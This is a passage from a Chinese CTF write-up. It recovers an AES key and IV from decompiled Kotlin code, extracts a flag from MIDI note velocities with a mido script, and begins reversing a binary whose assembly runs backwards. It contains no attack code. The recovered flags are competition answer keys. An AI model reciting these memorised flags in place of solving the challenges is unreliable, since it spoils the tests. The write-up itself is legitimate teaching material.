bridge */</span> <span class="comment">/* synthetic */</span> Unit <span class="title function_">invoke</span><span class="params">(Container container, TimeSpan timeSpan)</span> &#123;</span><br><span class="line">                m12invokehMs5a0(container, timeSpan.m9123unboximpl());</span><br><span class="line">                <span class="keyword">return</span> Unit.INSTANCE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* renamed from: invoke-hM-s5a0, reason: not valid java name */</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">m12invokehMs5a0</span><span class="params">(<span class="meta">@NotNull</span> Container $<span class="built_in">this</span>$addUpdater, <span class="type">double</span> it)</span> &#123;</span><br><span class="line">                <span class="type">List</span> <span class="variable">$this$fastForEach$iv</span> <span class="operator">=</span> $<span class="built_in">this</span>$addUpdater.getChildren();</span><br><span class="line">                <span class="type">int</span> <span class="variable">n$iv</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (n$iv &lt; $<span class="built_in">this</span>$fastForEach$iv.size()) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n$iv;</span><br><span class="line">                    n$iv++;</span><br><span class="line">                    <span class="type">View</span> <span class="variable">it2</span> <span class="operator">=</span> $<span class="built_in">this</span>$fastForEach$iv.get(i);</span><br><span class="line">                    it2.setZIndex($<span class="built_in">this</span>$addUpdater.getY());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title function_">bytesToHex</span><span class="params">(<span class="meta">@NotNull</span> <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] hexChars = <span class="keyword">new</span> <span class="title class_">char</span>[bytes.length * <span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> bytes[i] &amp; <span class="number">255</span>;</span><br><span class="line">            hexChars[i * <span class="number">2</span>] = <span class="string">&quot;0123456789abcdef&quot;</span>.charAt(v &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">            hexChars[(i * <span class="number">2</span>) + <span class="number">1</span>] = <span class="string">&quot;0123456789abcdef&quot;</span>.charAt(v &amp; <span class="number">15</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(hexChars);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title function_">transformKey</span><span class="params">(<span class="meta">@NotNull</span> String originalKey)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> StringsKt.dropLast(StringsKt.replace$<span class="keyword">default</span>(originalKey, <span class="string">&quot;a_true_key&quot;</span>, <span class="string">&quot;key_is&quot;</span>, <span class="literal">false</span>, <span class="number">4</span>, (Object) <span class="literal">null</span>), <span class="number">1</span>) + <span class="string">&quot;_true&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察得到了密文的十六进制<code>6d5a46c10a49b801c93098bf5904c1df4e95f800649807ac3b88f96998ad08c223b1b4b5b1c3c94a0da480104f0dd4e7</code>和iv<code>1234567890abcdef</code>，下面还有个密钥转换的函数，提取原密钥中的<code>a_true_key</code>部分替换为<code>key_is_true</code>，查找xref，在第五层的main函数找到引用：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">fifth$sceneMain$3</span> <span class="keyword">extends</span> <span class="title class_">SuspendLambda</span> <span class="keyword">implements</span> <span class="title class_">Function2</span>&lt;MouseEvents, Continuation&lt;? <span class="built_in">super</span> Unit&gt;, Object&gt; &#123;</span><br><span class="line">    <span class="type">int</span> label;</span><br><span class="line">    <span class="keyword">final</span> <span class="comment">/* synthetic */</span> UITextInput $flagInput;</span><br><span class="line">    <span class="keyword">final</span> <span class="comment">/* synthetic */</span> Text $resultText;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: package-private */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: &#x27;super&#x27; call moved to the top of the method (can break code semantics) */</span></span><br><span class="line">    <span class="keyword">public</span> fifth$sceneMain$<span class="number">3</span>(UITextInput $flagInput, Text $resultText, Continuation&lt;? <span class="built_in">super</span> fifth$sceneMain$<span class="number">3</span>&gt; continuation) &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="number">2</span>, continuation);</span><br><span class="line">        <span class="built_in">this</span>.$flagInput = $flagInput;</span><br><span class="line">        <span class="built_in">this</span>.$resultText = $resultText;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// kotlin.coroutines.jvm.internal.BaseContinuationImpl</span></span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Continuation&lt;Unit&gt; <span class="title function_">create</span><span class="params">(<span class="meta">@Nullable</span> Object value, <span class="meta">@NotNull</span> Continuation&lt;?&gt; continuation)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">fifth$sceneMain$3</span>(<span class="built_in">this</span>.$flagInput, <span class="built_in">this</span>.$resultText, continuation);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// kotlin.jvm.functions.Function2</span></span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">invoke</span><span class="params">(<span class="meta">@NotNull</span> MouseEvents p1, <span class="meta">@Nullable</span> Continuation&lt;? <span class="built_in">super</span> Unit&gt; continuation)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ((fifth$sceneMain$<span class="number">3</span>) create(p1, continuation)).invokeSuspend(Unit.INSTANCE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// kotlin.coroutines.jvm.internal.BaseContinuationImpl</span></span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">invokeSuspend</span><span class="params">(<span class="meta">@NotNull</span> Object obj)</span> &#123;</span><br><span class="line">        IntrinsicsKt.getCOROUTINE_SUSPENDED();</span><br><span class="line">        <span class="keyword">switch</span> (<span class="built_in">this</span>.label) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                ResultKt.throwOnFailure(obj);</span><br><span class="line">                <span class="type">String</span> <span class="variable">userInput</span> <span class="operator">=</span> StringsKt.trim((CharSequence) <span class="built_in">this</span>.$flagInput.getText()).toString();</span><br><span class="line">                <span class="type">String</span> <span class="variable">transformedKey</span> <span class="operator">=</span> aes_iv.transformKey(<span class="string">&quot;this_a_true_key?&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] key = transformedKey.getBytes(Charsets.UTF_8);</span><br><span class="line">                Intrinsics.checkNotNullExpressionValue(key, <span class="string">&quot;this as java.lang.String).getBytes(charset)&quot;</span>);</span><br><span class="line">                <span class="type">AES</span> <span class="variable">aes</span> <span class="operator">=</span> AES.INSTANCE;</span><br><span class="line">                <span class="type">byte</span>[] bytes = userInput.getBytes(Charsets.UTF_8);</span><br><span class="line">                Intrinsics.checkNotNullExpressionValue(bytes, <span class="string">&quot;this as java.lang.String).getBytes(charset)&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] encrypted = aes.encryptAes128Cbc(bytes, key);</span><br><span class="line">                <span class="keyword">if</span> (Intrinsics.areEqual(aes_iv.bytesToHex(encrypted), aes_iv.encrypt)) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.$resultText.setText(<span class="string">&quot;Right!&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">this</span>.$resultText.setText(<span class="string">&quot;Incorrect flag&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> Unit.INSTANCE;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;call to &#x27;resume&#x27; before &#x27;invoke&#x27; with coroutine&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么密钥就是<font color=red><strong>this_key_is_true</strong></font>，用AES-CBC解密，得到的flag却含有不可打印字符：<font color=lightblue><strong>flag{this_$9&#x3D;5#howmaker_will_not_appear}</strong></font>，再次查看，发现还有一个AES的类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">AES</span> &#123;</span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">AES</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AES</span>();</span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ALGORITHM</span> <span class="operator">=</span> <span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>;</span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">IV</span> <span class="operator">=</span> <span class="string">&quot;1234567890123456&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">AES</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">byte</span>[] encryptAes128Cbc(<span class="meta">@NotNull</span> <span class="type">byte</span>[] plainMessage, <span class="meta">@NotNull</span> <span class="type">byte</span>[] cipherKey) &#123;</span><br><span class="line">        <span class="type">SecretKeySpec</span> <span class="variable">keySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(cipherKey, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="type">IvParameterSpec</span> <span class="variable">ivSpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(CharsetKt.toByteArray$<span class="keyword">default</span>(IV, <span class="literal">null</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="literal">null</span>));</span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(ALGORITHM);</span><br><span class="line">        cipher.init(<span class="number">1</span>, keySpec, ivSpec);</span><br><span class="line">        <span class="type">byte</span>[] doFinal = cipher.doFinal(plainMessage);</span><br><span class="line">        Intrinsics.checkNotNullExpressionValue(doFinal, <span class="string">&quot;cipher.doFinal(plainMessage)&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> doFinal;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">byte</span>[] decryptAes128Cbc(<span class="meta">@NotNull</span> <span class="type">byte</span>[] encryptedMessage, <span class="meta">@NotNull</span> <span class="type">byte</span>[] cipherKey) &#123;</span><br><span class="line">        <span class="type">SecretKeySpec</span> <span class="variable">keySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(cipherKey, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="type">IvParameterSpec</span> <span class="variable">ivSpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(CharsetKt.toByteArray$<span class="keyword">default</span>(IV, <span class="literal">null</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="literal">null</span>));</span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(ALGORITHM);</span><br><span class="line">        cipher.init(<span class="number">2</span>, keySpec, ivSpec);</span><br><span class="line">        <span class="type">byte</span>[] doFinal = cipher.doFinal(encryptedMessage);</span><br><span class="line">        Intrinsics.checkNotNullExpressionValue(doFinal, <span class="string">&quot;cipher.doFinal(encryptedMessage)&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> doFinal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>则真正的iv是<code>1234567890123456</code>，flag：<font color=deepskyblue><strong>flag{this_time_showmaker_will_not_appear}</strong></font>.</p>
<h2 id="反方向的钟："><a href="#反方向的钟：" class="headerlink" title="反方向的钟："></a>反方向的钟：</h2><p>题目提示了是midi的LSB隐写，用Python的mido库提取信息：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mido</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_lsb_from_midi</span>(<span class="params">midi_path</span>):</span><br><span class="line">    mid = mido.MidiFile(midi_path)</span><br><span class="line">    binary_data = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> track <span class="keyword">in</span> mid.tracks:</span><br><span class="line">        <span class="keyword">for</span> msg <span class="keyword">in</span> track:</span><br><span class="line">            <span class="keyword">if</span> msg.<span class="built_in">type</span> == <span class="string">&#x27;note_on&#x27;</span>:</span><br><span class="line">                velocity = msg.velocity</span><br><span class="line">                lsb = velocity &amp; <span class="number">1</span></span><br><span class="line">                binary_data.append(<span class="built_in">str</span>(lsb))</span><br><span class="line">    </span><br><span class="line">    binary_str = <span class="string">&#x27;&#x27;</span>.join(binary_data)</span><br><span class="line">    bytes_list = [<span class="built_in">int</span>(binary_str[i:i+<span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_str), <span class="number">8</span>)]</span><br><span class="line">    m = <span class="built_in">bytes</span>(bytes_list)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">m = extract_lsb_from_midi(<span class="string">&#x27;E:/CTF/hide.mid&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>
<p>得到输出：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;flag&#123;cAn_y0u_g0_b@ck_to_t3e\x1ftime_wh3n_yOu_l0v3d_me&#125;\x105\x11\xa4\x00\x05\xf4\xb0\x03\xf8\x05h\x00\x00V\xc6\x10\x01\x82\x81 \x10\xd0\x05i@0$\x00T\x08 \x100\xa8\x01P\xc0\xf4(\x0c\x08\x10\x02\x93\x0e``\x14\x04b\x85!\x0b\x10\x06\xc4 \x80\x08\x10\x00@\x15\x8d\x007r\x18\x00\x8c\t@\x02c \x0b\x89\x81\x83\x0c($\xc0\x021\x83\x07\x08\x840\x01 \x00`\x03@\x00\x08@\nJ\x08a\x84\x81!\x00\x11\xb0HX\x00\xc4\x15\x1a\x00\x00*\x00\x82\x80h\xce\x01 C1)@\x00\x08\x88\x0eJ!\x90(\x000#0`\t8\x11\x00(\x10\x04\xf2`\x02Ea\x92\x00EF\x80r\xa0\x10B&quot;\x80\x80\x00\xb2&amp;@F\xd0\x01\xa0\xc0\x10\x80n\x00\x18\x0e\x00\x06\x14\xf4\x84\x00\x00\xc2\x0e@\x11&quot; \x11\x02\xaa\x00\x02\x05I\x00\x00\x04\x80\x00k%\x08\x18\x06\xa0\x01\x90 \x93\x84\x00\x00\x8f\xa1\xa0\x04\xa4(\xc0\x92\x08\x80:J\x92D\x00\x12\xf98\x01\x03T\x1a\t\x00\x06\x10\x06\x81\x13\x80\xa0\x00$\x80\x12\x04Q\x10\x01@\xc2\xd9\x11\x00\x10@\x00\xc1\x01\x8c\xd0\x81\x8c\x00\x84\x05\x00\x04\x14\x80kD\xc8\xd0c1\xc0\x08 \x00@\x00\x06\xc90\x00&lt;\x02P\x02\x08\xe1\x03`\x00\x9bU@\x18\x00-\x8e\x08\x02\x8d\xd4X[\x14\xb4\x80\x00h\xd0\\\x00Y`\t\x93\xab\xa8\x00\x04l\x03@\x13\\\x00l4\x04\x06\n\x12\x05\x04\x04u\xa0\x00\x80\x00\x06A\x04x\x058 \x06PE\x00\x0b\x91\xe4 \x08\x0c\x10\x80\x80\x00\x19\x03\x80`\x032\x002\x84\x1d$\x04\x00 L$\x08\x88\x11\xa2\xc6\x82\x04\x00\x07E\x16\x03\xc0\x1c \x95\x00\x84j\x80\x08\xd1\x00\x0c8A\x8b\x00\x03q\x12\x00\x16\x14\x01\n&quot;\xa0\x12\x80\x00\x940\x00\tx\x01\x0c\x08\x13\xa8@\x00\x1a\x98\x80\x04\x8e\x81@\x1c\x84\x06\x98\x900\x00\x10\x000)\x00\x03\\\x10\x00&quot;\x80\xa1\x04(\x04\x04\xef  \x00\x02C@\x05@\xa2f\x04`\x00\x10\x11@P\x00\x03\x06\x00\x00|p\x01\x16\x02\x01 \x02\x83\x00\x00\xbe \x80%\x99\x11\x89\x16\x80\xc0\x00\x07!\x00\x00\x84\xa6\x00\x07\x03DD\xc1\x81\x81\t!\x00\x00`\xc1\x00\x10\x84\x15P\x8aF\x00\x06Edt\x00\x16\x10\x0b&quot;\x14\x92H\x08\x00/\xad\x80\x00\x00B\xa0 \x01\x15F\x00\x07\x8e$D\x88\x01\x82\xc0Z\x80\xf0#@\x99A\x84\x9a\x00w\xc5\x02Y\x00\x10d\x04\x10\x008\n\x80\x99\x00\xd1\x00\x05\x18\xe3 5\x1c\xa8\x01\x10\x81\x04\x00\x19\x01\xc7\x08\r\x19\x82\xa5\x00\x11@z$\x90\x01\x04\x0e%\x00D\x00\x8e\xa8RH\x00\xe1P\\t\xa0\x02t\x0e\x81\x06\x02 \x04\x1b\xa1\x12\xd5(&lt;\x80\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<p>发现前几十个字节就是flag：<font color=lightblue><strong>flag{cAn_y0u_g0_b@ck_to_t3e\x1ftime_wh3n_yOu_l0v3d_me}</strong></font>，但这里中间有一个不可打印字符，猜测本来应该是下划线，得到flag：<font color=deepskyblue><strong>flag{cAn_y0u_g0_b@ck_to_t3e_time_wh3n_yOu_l0v3d_me}</strong></font>.</p>
<h1 id="Reverse方向："><a href="#Reverse方向：" class="headerlink" title="Reverse方向："></a>Reverse方向：</h1><h2 id="esrever："><a href="#esrever：" class="headerlink" title="esrever："></a>esrever：</h2><p>用ida反编译后发现main函数和start函数都比较诡异，且程序中还有大量的无法构成函数的代码段，在汇编界面查看发现main函数只有短短几行汇编，这肯定是不正确的，将所有函数取消定义后只转成汇编指令，发现在loc_1312的上面还有一些本应该出现在main中的指令，仔细观察后推断该程序的逻辑应该如其名一样，是倒着执行的，例如在开始的start附近的代码块：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000000000012C8 loc_12C8:                               <span class="comment">; CODE XREF: .text:00000000000012B9↑j</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012C8                 <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012CB                 <span class="keyword">cmp</span>     <span class="built_in">cs</span>:byte_4080, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012D2                 <span class="keyword">jz</span>      loc_115D</span><br><span class="line"><span class="symbol">.text:</span>00000000000012D8                 <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012DA                 <span class="keyword">call</span>    loc_14FE</span><br><span class="line"><span class="symbol">.text:</span>00000000000012DF                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012E2                 <span class="keyword">call</span>    ___isoc23_scanf <span class="comment">;读取输入</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012E7                 <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012EA                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012EC                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, aS         <span class="comment">; &quot;%s&quot; ;准备读取输入</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012F3                 <span class="keyword">call</span>    _printf <span class="comment">;输出已经加载好的字符串</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012F8                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012FF                 <span class="keyword">lea</span>     <span class="built_in">rbx</span>, byte_4080</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001306</span>                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001308</span>                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, aInputYourFlag <span class="comment">; &quot;Input your flag:&quot; ;加载要输出的字符串</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000130F                 <span class="keyword">push</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001310</span>                 <span class="keyword">inc</span>     <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001312</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001312</span> <span class="comment">; int loc_1312(int, char **, char **)</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001312</span> loc_1312:                               <span class="comment">; DATA XREF: .text:0000000000001334↓o</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001312</span>                 <span class="keyword">mov</span>     <span class="built_in">al</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001314</span>                 <span class="built_in">db</span>      <span class="number">2Eh</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001314</span>                 <span class="keyword">nop</span>     <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="built_in">rax</span>+<span class="number">00000000h</span>]</span><br><span class="line"><span class="symbol">.text:</span>000000000000131E                 <span class="keyword">xchg</span>    <span class="built_in">ax</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001320</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001320</span>                 <span class="meta">public</span> start</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001320</span> start:                                  <span class="comment">; DATA XREF: LOAD:0000000000000018↑o</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001320</span> <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001320</span>                 <span class="keyword">xor</span>     <span class="built_in">ebp</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001322</span>                 <span class="keyword">mov</span>     <span class="built_in">r9</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001325</span>                 <span class="keyword">pop</span>     <span class="built_in">rsi</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001326</span>                 <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001329</span>                 <span class="keyword">and</span>     <span class="built_in">rsp</span>, <span class="number">0FFFFFFFFFFFFFFF0h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000132D</span>                 <span class="keyword">push</span>    <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000132E                 <span class="keyword">push</span>    <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000132F                 <span class="keyword">xor</span>     <span class="built_in">r8d</span>, <span class="built_in">r8d</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001332</span>                 <span class="keyword">xor</span>     <span class="built_in">ecx</span>, <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001334</span>                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, loc_1312</span><br><span class="line"><span class="symbol">.text:</span>000000000000133B                 <span class="keyword">call</span>    <span class="built_in">cs</span>:off_3FC0 <span class="comment">;libc_start_main</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001341</span>                 <span class="keyword">hlt</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001341</span> <span class="comment">; &#125; // starts at 1320</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001341</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
<p>这里能很明显的观察到，在loc_1312的上方代码块中，从下到上才是正确的main函数执行逻辑，启动调试，忽略所有的信号，直接让程序跑到loc_1312的上方，观察程序逻辑，发现汇编指令确实是倒着运行的，大致运行逻辑为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Input your flag:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>之后call了一个代码块，也是倒着运行的：</p>
